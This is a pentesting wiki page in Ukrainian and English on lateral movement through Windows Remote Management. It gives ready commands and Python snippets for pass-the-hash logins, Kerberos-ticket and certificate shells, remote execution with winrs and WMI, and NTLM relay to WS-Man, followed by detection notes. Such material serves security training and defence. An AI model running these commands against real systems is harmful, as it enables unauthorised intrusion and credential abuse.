# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM є одним із найзручніших транспортів для **lateral movement** у середовищах Windows, оскільки надає віддалену оболонку через **WS-Man/HTTP(S)** без необхідності використовувати прийоми створення служб через SMB. Якщо ціль відкриває **5985/5986**, а ваш principal має дозвіл на використання remoting, часто можна дуже швидко перейти від "valid creds" до "interactive shell".

Для **protocol/service enumeration**, listeners, увімкнення WinRM, `Invoke-Command` і загального використання клієнтів дивіться:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Чому оператори надають перевагу WinRM

- Використовує **HTTP/HTTPS** замість SMB/RPC, тому часто працює там, де виконання у стилі PsExec заблоковане.
- За використання **Kerberos** не надсилає на ціль облікові дані, придатні для повторного використання.
- Коректно працює з **Windows**, **Linux** та Python-інструментами (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Інтерактивний шлях PowerShell remoting запускає на цілі **`wsmprovhost.exe`** у контексті автентифікованого користувача, що з операційного погляду відрізняється від виконання через служби.

## Модель доступу та prerequisites

На практиці успішний lateral movement через WinRM залежить від **трьох** речей:

1. На цілі є **WinRM listener** (`5985`/`5986`), а правила firewall дозволяють доступ.
2. Обліковий запис може **authenticate** до endpoint.
3. Обліковому запису дозволено **open a remoting session**.

Поширені способи отримати такий доступ:

- **Local Administrator** на цілі.
- Членство в **Remote Management Users** на новіших системах або у **WinRMRemoteWMIUsers__** на системах/компонентах, які все ще враховують цю групу.
- Явно делеговані права remoting через локальні security descriptors / зміни PowerShell remoting ACL.

Якщо ви вже контролюєте хост із правами адміністратора, пам’ятайте, що також можете **делегувати доступ до WinRM без повного членства в групі адміністраторів**, використовуючи методи, описані тут:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas, важливі під час lateral movement

- **Kerberos requires a hostname/FQDN**. Якщо підключатися за IP-адресою, клієнт зазвичай переходить до **NTLM/Negotiate**.
- У **workgroup** або в edge cases із cross-trust NTLM зазвичай вимагає або **HTTPS**, або додавання цілі до **TrustedHosts** на клієнті.
- Для **local accounts** через Negotiate у workgroup UAC remote restrictions можуть блокувати доступ, якщо не використовується вбудований обліковий запис Administrator або `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting за замовчуванням використовує **`HTTP/<host>` SPN**. У середовищах, де **`HTTP/<host>`** уже зареєстрований за іншим service account, WinRM Kerberos може завершитися помилкою `0x80090322`; використовуйте SPN із зазначенням порту або перейдіть на **`WSMAN/<host>`**, якщо цей SPN існує.<sup>[[3]](#references)</sup>

Якщо під час password spraying вам вдалося отримати валідні облікові дані, перевірка їх через WinRM часто є найшвидшим способом з’ясувати, чи можна використати їх для отримання shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement з Linux до Windows

### NetExec / CrackMapExec для перевірки та одноразового виконання
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM для інтерактивних shell

`evil-winrm` залишається найзручнішим варіантом для інтерактивної роботи з Linux, оскільки підтримує **паролі**, **NT-хеші**, **квитки Kerberos**, **клієнтські сертифікати**, передавання файлів і завантаження PowerShell/.NET у пам'ять.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Граничний випадок Kerberos SPN: `HTTP` проти `WSMAN`

Коли стандартний **`HTTP/<host>`** SPN спричиняє помилки Kerberos, спробуйте запитати або використати ticket **`WSMAN/<host>`**. Це трапляється в посилених або нестандартних корпоративних середовищах, де **`HTTP/<host>`** уже прив’язаний до іншого облікового запису служби.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Це також корисно після зловживання **RBCD / S4U**, коли ви спеціально підробили або запросили service ticket **WSMAN**, а не загальний ticket `HTTP`.

### Автентифікація на основі сертифіката

WinRM також підтримує **автентифікацію клієнта за сертифікатом**, але сертифікат має бути зіставлений на цільовій системі з **локальним обліковим записом**. З offensive perspective це важливо, коли:

- ви викрали або експортували дійсний сертифікат клієнта та приватний ключ, які вже зіставлені для WinRM;
- ви використали **AD CS / Pass-the-Certificate**, щоб отримати сертифікат для principal, а потім перейти до іншого шляху автентифікації;
- ви працюєте в середовищах, які навмисно уникають віддаленого керування на основі паролів.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM зустрічається значно рідше, ніж password/hash/Kerberos auth, але коли він доступний, то може забезпечити шлях для **passwordless lateral movement**, який зберігається після ротації пароля.

### Python / automation with `pypsrp`

Якщо вам потрібна automation, а не operator shell, `pypsrp` надає WinRM/PSRP із Python із підтримкою **NTLM**, **certificate auth**, **Kerberos** і **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Якщо вам потрібен точніший контроль, ніж надає високорівнева обгортка `Client`, API нижчого рівня `WSMan` + `RunspacePool` корисні для розв’язання двох поширених задач оператора:

- примусове використання **`WSMAN`** як служби/SPN Kerberos замість очікуваного за замовчуванням `HTTP`, яке використовують багато клієнтів PowerShell;
- підключення до **нестандартної кінцевої точки PSRP**, наприклад **JEA** / custom session configuration, замість `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Custom PSRP endpoints and JEA мають значення під час lateral movement

Успішна автентифікація WinRM **не завжди означає**, що ви потрапите до стандартної необмеженої кінцевої точки `Microsoft.PowerShell`. Зрілі середовища можуть надавати **custom session configurations** або кінцеві точки **JEA** із власними ACLs і поведінкою run-as.<sup>[[1]](#references)</sup>

Якщо ви вже маєте code execution на Windows-хості й хочете зрозуміти, які поверхні remoting доступні, перелічіть зареєстровані кінцеві точки:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Коли існує корисний endpoint, явно націлюйтеся на нього замість shell за замовчуванням:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Практичні наслідки для offensive:

- **restricted** endpoint усе одно може бути достатнім для lateral movement, якщо він надає доступ лише до потрібних cmdlets/functions для керування службами, доступу до файлів, створення процесів або довільного виконання команд .NET / external.
- **Misconfigured JEA** role особливо цінна, якщо вона надає доступ до небезпечних команд, таких як `Start-Process`, широких wildcard-масок, доступних для запису providers або custom proxy functions, які дають змогу вийти за межі передбачених обмежень.
- Endpoints, що працюють із **RunAs virtual accounts** або **gMSAs**, змінюють ефективний security context команд, які ви запускаєте. Зокрема, endpoint на основі gMSA може надати **network identity on the second hop**, навіть коли звичайна WinRM-сесія стикається з класичною проблемою delegation.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` вбудований у систему та корисний, коли вам потрібне **native WinRM command execution** без відкриття інтерактивної PowerShell remoting-сесії:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Два прапорці легко забути, хоча на практиці вони важливі:

- `/noprofile` часто потрібен, коли **remote principal** не є локальним адміністратором.
- `/allowdelegate` дає змогу **remote shell** використовувати ваші облікові дані для доступу до **третього хоста** (наприклад, коли команді потрібен доступ до `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
На практиці `winrs.exe` зазвичай створює віддалений ланцюжок процесів, подібний до:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Це варто запам’ятати, оскільки цей спосіб відрізняється від service-based exec і від інтерактивних PSRP-сесій.

### `winrm.cmd` / WS-Man COM замість PowerShell remoting

Також можна виконувати команди через **WinRM transport** без `Enter-PSSession`, викликаючи класи WMI через WS-Man. У цьому випадку transport залишається WinRM, а примітивом віддаленого виконання стає **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Цей підхід корисний, коли:

- PowerShell logging активно моніториться.
- Вам потрібен **WinRM transport**, але не класичний PS remoting workflow.
- Ви створюєте або використовуєте custom tooling навколо COM-об’єкта **`WSMan.Automation`**.

## NTLM relay до WinRM (WS-Man)

Коли SMB relay заблоковано через signing, а LDAP relay обмежено, **WS-Man/WinRM** все ще може бути привабливою ціллю для relay. Сучасний `ntlmrelayx.py` містить **WinRM relay servers** і може виконувати relay до цілей **`wsman://`** або **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Два практичні зауваження:

- Relay найкорисніший, коли ціль приймає **NTLM**, а relayed principal має дозвіл використовувати WinRM.
- Останній код Impacket спеціально обробляє запити **`WSMANIDENTIFY: unauthenticated`**, тому probes у стилі `Test-WSMan` не переривають процес Relay.

Щодо обмежень multi-hop після отримання першої WinRM-сесії дивіться:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Примітки щодо OPSEC і виявлення

- **Interactive PowerShell remoting** зазвичай створює **`wsmprovhost.exe`** на цілі.
- **`winrs.exe`** зазвичай створює **`winrshost.exe`**, а потім запитаний дочірній процес.
- Користувацькі кінцеві точки **JEA** можуть виконувати дії як віртуальні облікові записи **`WinRM_VA_*`** або як налаштований **gMSA**, що змінює телеметрію та поведінку другого переходу порівняно зі shell у контексті звичайного користувача.<sup>[[1]](#references)</sup>
- Очікуйте телеметрію **network logon**, події служби WinRM і журналювання PowerShell operational/script-block, якщо використовуєте PSRP, а не raw `cmd.exe`.
- Якщо потрібна лише одна команда, `winrs.exe` або одноразове виконання через WinRM може бути менш помітним, ніж довготривала інтерактивна remoting-сесія.
- Якщо доступний Kerberos, віддавайте перевагу **FQDN + Kerberos** замість IP + NTLM, щоб зменшити проблеми з довірою та потребу в незручних змінах клієнтського `TrustedHosts`.

## Посилання

- [1] [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
